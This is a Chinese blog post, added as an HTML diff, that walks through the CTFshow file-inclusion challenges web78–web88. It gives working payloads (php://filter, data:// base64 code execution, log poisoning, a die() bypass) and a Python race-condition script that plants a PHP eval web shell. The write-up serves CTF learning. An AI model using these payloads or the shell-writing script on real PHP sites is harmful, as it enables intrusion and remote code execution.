@@ -1,0 +1,256 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>【CTFSHOW】 web入门文件包含 | 西风の小屋</title><meta name="author" content="ZEPHeyrr"><meta name="copyright" content="ZEPHeyrr"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="文件包含漏洞：文件包含：程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做合理的校验或者校验被绕过就造成了文件包含漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【CTFSHOW】 web入门文件包含">
+<meta property="og:url" content="http://example.com/2022/01/10/fileinc/index.html">
+<meta property="og:site_name" content="西风の小屋">
+<meta property="og:description" content="文件包含漏洞：文件包含：程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做合理的校验或者校验被绕过就造成了文件包含漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/222.jpg">
+<meta property="article:published_time" content="2022-01-10T07:29:38.000Z">
+<meta property="article:modified_time" content="2022-01-12T09:20:00.506Z">
+<meta property="article:author" content="ZEPHeyrr">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/222.jpg"><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="http://example.com/2022/01/10/fileinc/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【CTFSHOW】 web入门文件包含',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-12 09:20:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/macblack.css"><link rel="stylesheet" href="/css/mouse.css"><link rel="stylesheet" href="/css/trans.css"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heart"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo"><i class="fa-fw fa fa-comment"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Message"><i class="fa-fw fas fa-comment"></i><span> 留言</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/bckg.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">西风の小屋</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heart"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo"><i class="fa-fw fa fa-comment"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/Message"><i class="fa-fw fas fa-comment"></i><span> 留言</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【CTFSHOW】 web入门文件包含</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-10T07:29:38.000Z" title="发表于 2022-01-10 07:29:38">2022-01-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-12T09:20:00.506Z" title="更新于 2022-01-12 09:20:00">2022-01-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【CTFSHOW】 web入门文件包含"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="文件包含漏洞："><a href="#文件包含漏洞：" class="headerlink" title="文件包含漏洞："></a>文件包含漏洞：</h1><h2 id="文件包含："><a href="#文件包含：" class="headerlink" title="文件包含："></a>文件包含：</h2><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端又没有做合理的校验或者校验被绕过就造成了文件包含漏洞。</p>
+<h2 id="常见函数："><a href="#常见函数：" class="headerlink" title="常见函数："></a>常见函数：</h2><ul>
+<li><p>include( )</p>
+<p>当使用该函数包含文件时，只有代码执行到 include()函数时才将文件包含<br>进来，发生错误时之给出一个警告，继续向下执行。</p>
+</li>
+<li><p>include_once( )</p>
+<p>功能与Include()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
+</li>
+<li><p>require( )</p>
+<p>require()与include()的区别在于require()执行如果发生错误，函数会输出<br>错误信息，并终止脚本的运行。</p>
+</li>
+<li><p>require_once( )</p>
+<p>功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
+</li>
+</ul>
+<h1 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78:"></a>web78:</h2><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。此题使用的php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/web78-1.PNG" alt="``"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="web79："><a href="#web79：" class="headerlink" title="web79："></a>web79：</h2><p>过滤了“php”，意味着上题的伪协议将无法使用。介绍另一个封装器data://。 类似php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,[base64_encode_shell]</span><br></pre></td></tr></table></figure>
+
+<p>shell处更换为<code>PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs=</code>，即<code>&lt;?php system(&quot;cat flag.php&quot;);</code>的base64编码，flag在页面源码注释里。</p>
+<h2 id="web80："><a href="#web80：" class="headerlink" title="web80："></a>web80：</h2><p>同时过滤了前面两题使用的php和data。而服务器运行后会记录我们的User-Agent操作（或直接通过url，但是这一题对url的过滤很严），我们可以通过日志文件来获取flag。根据题目提示，日志文件路径为/var/log/nginx/access.log。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/web80-1.png"></p>
+<p>然后读取fl0g.php即可。</p>
+<h2 id="web81："><a href="#web81：" class="headerlink" title="web81："></a>web81：</h2><p>在之前的基础上又过滤了冒号，应该是为了防范远程文件包含。但是使用上题解法也可以执行命令。</p>
+<p>这里我们使用post变量的方式也能执行命令。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/web81-1.png"></p>
+<h2 id="web82："><a href="#web82：" class="headerlink" title="web82："></a>web82：</h2><p>利用php5.4的PHP_SESSION_UPLOAD_PROGRESS进行文件包含，在其配置文件下有几个选项：</p>
+<p>​    </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on    //表示upload_progress功能开启，意味着浏览器上传文件时php会记录文件上传的相关信息（如上传时间和进度）储存在session中</span><br><span class="line">2. session.upload_progress.cleanup = on    //表示文件上传结束后php会立即清除session文件内容</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;   </span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;  //这两个参数将表示为session的键名</span><br></pre></td></tr></table></figure>
+
+<p>这里先写一个网页用来上传文件：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://03d137db-9e2b-4e16-9c1b-da3c7e0aa900.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;web82&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传文件，抓包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/web82.png"></p>
+<p>由于clearup参数默认开启，所以我们需要在session文件被删除前利用它。所以需要条件竞争，开启爆破</p>
+<p>payload可以如下设置</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/web82-2.png"></p>
+<p>抓取访问题目地址的包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/web82-1.png"></p>
+<p>开启爆破后运气好的话可以在response包中找到执行ls的结果。但是这里由于bp不够迅速的原因，并没有成功。</p>
+<p>这里再提供群主的方法，使用python脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://0a5cb718-8127-4cc4-b854-94014158d58f.challenge.ctf.show/&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;<span class="comment">#上传后访问2.php即可</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    fileBytes=io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)  <span class="comment">#尽可能大</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url,</span><br><span class="line">                              data=&#123;</span><br><span class="line">                                  <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span> <span class="comment">#这个马是为了执行data处的马</span></span><br><span class="line">                              &#125;,</span><br><span class="line">                              cookies=&#123;</span><br><span class="line">                                  <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">                              &#125;,</span><br><span class="line">                              files=&#123;</span><br><span class="line">                                  <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ccc.jpg&#x27;</span>,fileBytes)</span><br><span class="line">                              &#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,</span><br><span class="line">                              cookies=&#123;</span><br><span class="line">                                  <span class="string">&#x27;PHPSESSID&#x27;</span>: sessionid</span><br><span class="line">                              &#125;)</span><br><span class="line">        response2=session.get(url+<span class="string">&#x27;2.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> response2.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++done++++++++&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response2.status_code)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session, )).start()</span><br><span class="line"></span><br><span class="line">    event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web87："><a href="#web87：" class="headerlink" title="web87："></a>web87：</h2><p>本题题目源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>功能就是将content的内容写入file，我们可以利用这个文件解题。但是在file_put_contents中还有die（）函数在content之前被写入，脚本被终止运行，导致我们即使写入一句话也没法执行。好在定义的file名称是可控的，那么可以使用filter协议限定文件的解析方式，再以base64编码的方式写入一句话。</p>
+<p>首先，由于题目源码中有urldecode，将使用协议和文件名进行两次url（hex）编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=1.php</span><br><span class="line"></span><br><span class="line">%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>再将写入的一句话进行base64编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[a]);?&gt;</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdie”和我们传入的其他字符。“phpdie”共6个字符，由于base64算法解码时以4bytes为一组，所以在传入的content前再加两个字符“aa”凑成8个字符，最终被解码的结果就是“phpdie”和传入的一句话。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/web87.PNG"></p>
+<p>然后访问1.php,post a=system(tac f*);即可</p>
+<p>同理也能用字符串操作来绕过die（），但这个方法并不会去除&lt;?标签，若服务器开启过滤的话该方法失效。</p>
+<h2 id="web88："><a href="#web88：" class="headerlink" title="web88："></a>web88：</h2><p>过滤了很多东西，但是没有过滤：和//。那么使用data协议。利用data:// 伪协议可以直接达到执行php代码的效果</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTsgPz4</span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是，这一题过滤了‘=’，所以需要手动把’=’删除。</p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ZEPHeyrr</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/01/10/fileinc/">http://example.com/2022/01/10/fileinc/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">西风の小屋</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/222.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/14/ctfshow-sqli/"><img class="prev-cover" src="/222.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【CTFSHOW】 web入门sql注入</div></div></a></div><div class="next-post pull-right"><a href="/2021/12/31/ctfshow-nodejs/"><img class="next-cover" src="/222.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【CTFSHOW】 web入门nodejs</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ZEPHeyrr</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZEPHeyrr"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我就是又菜又爱玩怎么啦 =^=  <img src="https://cdn.jsdelivr.net/gh/ZEPHeyrr/images/images/�����������籬ը�ƶԻ���ԭ���Ի�����4gif.gif"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">文件包含漏洞：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">文件包含：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">常见函数：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">题目：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web78"><span class="toc-number">2.1.</span> <span 